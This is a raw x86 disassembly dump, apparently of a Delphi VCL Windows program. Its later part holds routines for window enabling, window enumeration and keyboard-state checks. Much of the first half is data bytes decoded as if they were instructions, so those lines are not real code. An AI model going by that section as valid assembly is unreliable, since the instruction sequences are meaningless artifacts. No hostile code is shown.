imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070046 ] al
outsb
inc ebx
insb
inc edx
outsw
jb r-xdata
cmovg ebp [ esi + 0x41 ]
cmp eax [ ecx ]
rol [ edx ] 0x1
add bh bh
rol [ edx ] 0x1
add bh bh
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0043 ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
ror dl 0x44
add al ah
add al [ eax ]
jmp eax
add [ eax ] al
add [ ebp ] 0x7
dec edi
insb
imul esp [ edi + 0x6e ] 0x69736f50
je r-xdata
xor al 0x80
inc ebx
add [ eax ] dh
add al [ eax ]
push [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f000e ] al
outsb
inc ecx
outsd
jae r-xdata
outsd
outsb
xor al 0x76
inc ebx
add [ eax - 0x4f010000 ] dh
add [ eax ] al
jmp [ eax + 0x1c ]
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0044 ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
int3
add [ eax + 0x4f09004c ] al
outsb
inc esp
jae r-xdata
js r-xdata
jne r-xdata
jpe r-xdata
hlt
jb r-xdata
add al ch
add al [ eax ]
push eax
outsd
jo r-xdata
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08004a ] al
outsb
inc ebx
jb r-xdata
jb r-xdata
push ecx
outsb
inc ebx
insb
cmp eax [ ecx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070045 ] al
jbe r-xdata
jns r-xdata
call 0x6143da62
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c004d ] al
jo r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
insb
movsb [ edi ] [ esi ]
jbe r-xdata
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
jb r-xdata
dec edi
cmp eax [ ecx ]
call 0xffffffffe943da5e
add al [ eax ]
jmp [ eax + 0x1c ]
dec edi
outsb
inc esp
jb r-xdata
clc
jae r-xdata
cmp eax [ ecx ]
sbb [ ebx ] al
add bh bh
sbb [ ebx ] al
add bh bh
cmp eax [ ecx ]
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004b ] al
insb
dec ecx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130048 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
imul esp [ ebp + 0x40 ] 0xf00044cb
add al [ eax ]
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060055 ] al
outsb
dec eax
insb
jo r-xdata
add [ eax ] al
add al [ eax ]
inc [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or cl [ edi + 0x6e ]
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0d0053 ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
add al ah
add [ eax ] eax
jmp eax
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
and [ ebx ] al
add bh bh
and [ ebx ] al
add bh bh
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
add bh bh
jno r-xdata
add bh bh
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090056 ] al
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0x6c6f666e
dec edi
jbe r-xdata
add al bl
add [ eax ] al
cmp eax [ ecx ]
clc
add al [ eax ]
outsb
outsw
insb
jo r-xdata
jmp [ eax + 0x1c ]
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
jae r-xdata
add [ eax ] cl
add al [ eax ]
dec [ eax ]
add al [ eax ]
jmp [ eax + 0x1c ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
push esp
add [ esi ] al
dec edi
outsb
dec eax
jb r-xdata
dec ecx
jb r-xdata
cmp eax [ ecx ]
in al 0x71
inc ebx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
jmp [ eax + 0x1c ]
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ebx
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
popad
je r-xdata
xor [ edx + 0x43 ] dh
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
jmp [ eax + 0x1c ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
add [ edx ] cl
dec edi
outsb
jae r-xdata
outsd
arpl [ ebx - 0x58 ] bp
jne r-xdata
add al ah
add [ eax ] al
jmp eax
jae r-xdata
inc ebp
add al al
add [ eax ] al
inc eax
add [ eax ] al
jmp [ eax + 0x1c ]
jno r-xdata
pop esp
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
push eax
jo r-xdata
je r-xdata
add al bh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0061 ] al
push ebp
sbb [ esi ] 0x9
dec edi
jb r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
push 0xbc6c6565
ja r-xdata
dec esp
popad
jbe r-xdata
jae r-xdata
jns r-xdata
cmp eax [ ecx ]
adc [ ebx ] al
add bh bh
adc [ ebx ] al
add bh bh
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060065 ] al
outsb
push ebx
push 0x755c776f
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0066 ] al
outsb
push ebx
je r-xdata
push edi
push 0x556c6565
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pushad
add [ eax ] dl
dec edi
ja r-xdata
outsd
jne r-xdata
jo r-xdata
push ebp
cmp eax [ ecx ]
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jae r-xdata
inc esp
outsd
ja r-xdata
outsb
dec ebp
dec edi
outsb
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
dec edi
enter 0x4370 0x0
enter 0x0 0xff
enter 0x0 0xff
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005d ] al
outsb
dec ebp
outsd
jne r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09005e ] al
outsb
je r-xdata
inc ebp
inc esp
add al al
inc ecx
inc eax
add [ eax + 0x2f ] al
inc ebp
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add ah al
inc [ eax + eax + 0x48 ]
dec eax
jb r-xdata
add [ eax ] dl
add eax [ eax ]
call [ eax ]
add eax [ eax ]
jmp [ eax + 0x1c ]
cmp eax [ ecx ]
add [ ebx ] al
add bh bh
add [ ebx ] al
add bh bh
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070062 ] al
jae r-xdata
push edi
jne r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c005f ] al
add [ eax + 0x4f100060 ] al
dec ebp
insb
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
call 0xffffffffe943dd95
add [ eax ] al
jmp [ eax + 0x1c ]
add [ edi ] al
dec edi
push edi
push 0x446c6565
outsd
ja r-xdata
outsd
jbe r-xdata
dec ebp
inc esp
add [ eax - 0x37ffbafb ] bh
insd
inc ecx
add [ eax + 0x59 ] dh
inc ebp
add ah ch
add [ ebp ] eax
sub [ ebx ] al
inc ebp
add [ eax ] dh
mov edi 0xe2000043
inc ecx
add [ eax - 0x23ffbaf4 ] bh
fiadd [ ecx ]
movsb [ edi ] [ esi ]
push ebp
inc ebp
add al bh
push edi
inc ebp
add [ edx + eax * 2 + 0x44 ] ch
add [ eax + 0x48 ] bh
inc esp
add ah al
inc edi
inc esp
add [ eax ] ah
mov dl 0x43
add [ eax ] dh
cmp eax 0x8ec0044
inc ebp
add [ ecx + edi - 0x4e9fffbc ] bh
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add al ah
or [ ebp ] eax
inc esp
0x52700043 0x45
add [ eax + 0x48 ] cl
inc esp
je r-xdata
jpe r-xdata
add al 0xcb
inc esp
add [ eax ] cl
add eax [ eax ]
dec [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0064 ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
mov esp 0x50004377
add [ eax ] eax
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
add [ esi ] cl
dec ebp
outsd
adc [ edi + 0x6e ] cl
push eax
jo r-xdata
fild [ eax + eax + 0x60 ]
add eax [ eax ]
add al bl

add [ eax ] ah
add al [ eax ]
jmp [ eax ]
nop
fild [ eax + eax - 0x38 ]
outsd
arpl [ ebx - 0x10 ] bp
je r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp st7
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x37ffbb21 ] dl
insb
push edi
add al dl
add [ eax ] al
call eax
add [ eax ] al
jmp [ eax + 0x1c ]
sub_44e02c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44 ] dh
add [ eax + eax ] cl
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax ] cl
push esp
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0xcc00408d
loopne r-xdata
inc esp
add [ eax - 0x53ffbaa2 ] al
outsb
inc ecx
add ah ch
fld [ ecx ]
enter 0x416d 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
loopne r-xdata
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
add [ ecx ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] cl
loope r-xdata
add [ eax ] al
loop r-xdata
add [ eax + 0x70000000 ] ah
push eax
inc ecx
add al ch
loope r-xdata
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
add ah ah
fiadd [ ecx ]
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
cmp al 0xe1
inc esp
add [ esi ] cl
add [ eax ] ch
pop ebp
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x38004010 ] dh
add [ eax ] al
add [ edi ] al
push esp
push ebx
arpl [ edx + 0x65 ] si
add [ eax ] al
add [ eax ] al
loop r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x38004010 ] dh
add [ eax ] al
add [ eax + r-xdata ] dl
adc [ edi ] ecx
push esp
push eax
outsd
jo r-xdata
add al cl
insd
inc ecx
add ah al
add [ edx + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x1e ] al
inc esp
add [ eax + 0x1 ] ch
add [ eax ] al
jo r-xdata
enter 0x416d 0x0
jo r-xdata
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + 0x38004010 ] dh
add [ eax ] al
add [ eax + 0x3c004010 ] dh
add [ eax ] al
add [ eax + esi * 8 ] dl
inc ecx
add [ eax + eax ] cl
add [ eax + 0x50004010 ] dh
add [ eax ] al
add [ eax + 0x54004010 ] dh
add [ eax ] al
add [ eax - 0x73ffbff0 ] dh
add [ eax ] al
add [ eax - 0x1f ] bl
inc ecx
add al ch
loope r-xdata
add [ eax + 0x50 ] dh
outsd
jb r-xdata
sti
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
push esp
loop r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ ecx + esi * 2 + 0x45 ] cl
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
fld [ ecx ]
inc ecx
jb r-xdata
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
inc esp
add al dl
add [ eax ] al
add [ esp + edx * 2 ] cl
inc ecx
jo r-xdata
add [ eax ] dh
outsd
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
popad
jns r-xdata
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
shl cl 0x1
inc esp
add [ ecx + edx * 2 + 0x41 ] ch
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
add [ ecx + rw-data ] ah
retn
outsb
mov eax eax
sbb al 0xe1
inc esp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
int3
shl cl 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_44e084
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
loopne r-xdata
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
add [ ecx ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] cl
loope r-xdata
add [ eax ] al
loop r-xdata
add [ eax + 0x70000000 ] ah
push eax
inc ecx
add al ch
loope r-xdata
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
add ah ah
fiadd [ ecx ]
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x53ffbaa2 ] al
outsb
inc ecx
add ah ch
fld [ ecx ]
enter 0x416d 0x0
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
cmp al 0xe1
inc esp
add [ esi ] cl
add [ eax ] ch
pop ebp
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x38004010 ] dh
add [ eax ] al
add [ edi ] al
push esp
push ebx
arpl [ edx + 0x65 ] si
add [ eax ] al
add [ eax ] al
loop r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x38004010 ] dh
add [ eax ] al
add [ eax + r-xdata ] dl
adc [ edi ] ecx
push esp
push eax
outsd
jo r-xdata
add al cl
insd
inc ecx
add ah al
add [ edx + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x1e ] al
inc esp
add [ eax + 0x1 ] ch
add [ eax ] al
jo r-xdata
enter 0x416d 0x0
jo r-xdata
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + 0x38004010 ] dh
add [ eax ] al
add [ eax + 0x3c004010 ] dh
add [ eax ] al
add [ eax + esi * 8 ] dl
inc ecx
add [ eax + eax ] cl
add [ eax + 0x50004010 ] dh
add [ eax ] al
add [ eax + 0x54004010 ] dh
add [ eax ] al
add [ eax - 0x73ffbff0 ] dh
add [ eax ] al
add [ eax - 0x1f ] bl
inc ecx
add al ch
loope r-xdata
add [ eax + 0x50 ] dh
outsd
jb r-xdata
sti
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
push esp
loop r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ ecx + esi * 2 + 0x45 ] cl
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
fld [ ecx ]
inc ecx
jb r-xdata
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
inc esp
add al dl
add [ eax ] al
add [ esp + edx * 2 ] cl
inc ecx
jo r-xdata
add [ eax ] dh
outsd
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
popad
jns r-xdata
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
shl cl 0x1
inc esp
add [ ecx + edx * 2 + 0x41 ] ch
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
add [ ecx + rw-data ] ah
retn
outsb
mov eax eax
sbb al 0xe1
inc esp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
int3
shl cl 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_44e178
inc [ eax ]
add [ eax ] al
add [ 0x6d726f46 ] al
jae r-xdata
outsb
mov eax eax
sbb al 0xe1
inc esp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
int3
shl cl 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loop r-xdata
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
add [ edx + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x1e ] al
inc esp
add [ eax + 0x1 ] ch
add [ eax ] al
jo r-xdata
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + 0x38004010 ] dh
add [ eax ] al
add [ eax + 0x3c004010 ] dh
add [ eax ] al
add [ eax + esi * 8 ] dl
inc ecx
add [ eax + eax ] cl
add [ eax + 0x50004010 ] dh
add [ eax ] al
add [ eax + 0x54004010 ] dh
add [ eax ] al
add [ eax - 0x73ffbff0 ] dh
add [ eax ] al
add [ eax - 0x1f ] bl
inc ecx
add al ch
loope r-xdata
sti
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
push esp
loop r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ ecx + esi * 2 + 0x45 ] cl
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
inc esp
add al dl
add [ eax ] al
add [ esp + edx * 2 ] cl
inc ecx
jo r-xdata
add [ eax ] dh
outsd
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
shl cl 0x1
inc esp
add [ ecx + edx * 2 + 0x41 ] ch
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ ecx + rw-data ] ah
retn
sub_44e284
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_44e2d0
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_458fe4
mov eax [ rw-data ]
call sub_41dd10
mov eax [ rw-data ]
call sub_41dcb4
retn
xor edx edx
mov eax [ rw-data ]
call sub_457748
sub_44e308
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_402d28
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_44e358
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_44e409
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ rw-data ] 0x1
xor eax eax
push ebp
push sub_44e3cb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_44e308
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e410
mov [ rw-data ] 0x0
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_44e41c
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_402d44
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_44e454
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_44e4b8
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_44e454
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_44e514
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_44e534
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_44e514
call GetCurrentThreadId
push eax
call EnumThreadWindows
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_44e560
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_455fd4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_456448
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_409244
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_455fc0
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_456434
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_409244
test eax eax
je r-xdata
sub_44e5e0
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44e638
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44e678
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_44e6c4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e722
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4361c8
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40502c
mov eax [ ebp - 0x8 ]
pop edx
call sub_409244
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e729
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_44e734
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
test bl bl
jne r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax esi
